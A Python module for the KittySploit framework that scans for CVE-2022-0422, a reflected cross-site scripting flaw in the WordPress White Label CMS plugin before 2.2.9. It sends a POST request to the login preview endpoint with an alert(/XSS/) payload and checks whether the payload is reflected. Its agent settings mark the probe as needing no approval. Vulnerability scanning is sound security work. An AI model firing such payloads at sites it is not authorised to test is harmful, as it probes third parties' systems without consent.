#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress White Label CMS plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress White Label CMS <2.2.9 - Cross-Site Scripting Detection',
        'description': 'WordPress White Label CMS plugin before 2.2.9 contains a reflected cross-site scripting vulnerability. It does not sanitize and validate the wlcms[_login_custom_js] parameter before outputting it back in the response while previewing.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'wordpress', 'xss', 'wp-plugin', 'wpscan', 'videousermanuals', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/429be4eb-8a6b-4531-9465-9ef0d35c12cc',
            'https://plugins.trac.wordpress.org/changeset/2672615',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-0422',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-0422',
    }

    def run(self):
        path = '/wp-login.php?wlcms-action=preview'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='wlcms%5B_login_custom_js%5D=alert%28%2FXSS%2F%29%3B\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('alert(/XSS/);', 'wlcms-login-wrapper',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress White Label CMS <2.2.9 - Cross-Site Scripting detected', path=path)
            return True
        return False

